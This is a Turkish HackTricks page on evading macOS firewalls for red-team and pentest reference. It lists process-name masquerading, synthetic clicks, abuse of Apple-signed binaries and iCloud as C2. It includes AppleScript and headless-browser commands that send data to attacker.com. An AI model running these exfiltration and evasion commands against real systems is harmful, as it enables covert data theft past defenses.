# macOS Güvenlik Duvarlarını Atlatma

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi**]'ni (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'in (https://opensea.io/collection/the-peass-family) bulunduğu koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına PR göndererek.

</details>

## Bulunan Teknikler

Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalıştığı tespit edilmiştir.

### Beyaz liste adlarını kötüye kullanma

* Örneğin, zararlı yazılımı **`launchd`** gibi iyi bilinen macOS işlemleri adlarıyla çağırmak

### Sentetik Tıklama

* Güvenlik duvarı kullanıcıdan izin istediğinde zararlı yazılımın **izin ver'e tıklamasını sağlamak**

### **Apple imzalı ikilileri kullanma**

* **`curl`** gibi, ayrıca **`whois`** gibi diğerleri

### Tanınmış apple alan adları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantıları izin veriyor olabilir. Ve iCloud bir C2 olarak kullanılabilir.

### Genel Atlatma

Güvenlik duvarlarını atlatmaya yönelik bazı fikirler

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listelenmiş alan adlarını veya bunlara erişime izin verilen uygulamaları belirlemenize yardımcı olacaktır
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS Kullanımı

DNS çözümlemeleri muhtemelen DNS sunucularına erişime izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla yapılır.

<figure><img src="../../.gitbook/assets/image (464).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Aracılığıyla

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### İşlem enjeksiyonu aracılığıyla

Eğer **bir işleme kod enjekte edebilirseniz** ve bu işlem herhangi bir sunucuya bağlanmaya izin veriliyorsa, güvenlik duvarı korumalarını atlayabilirsiniz:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referanslar

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
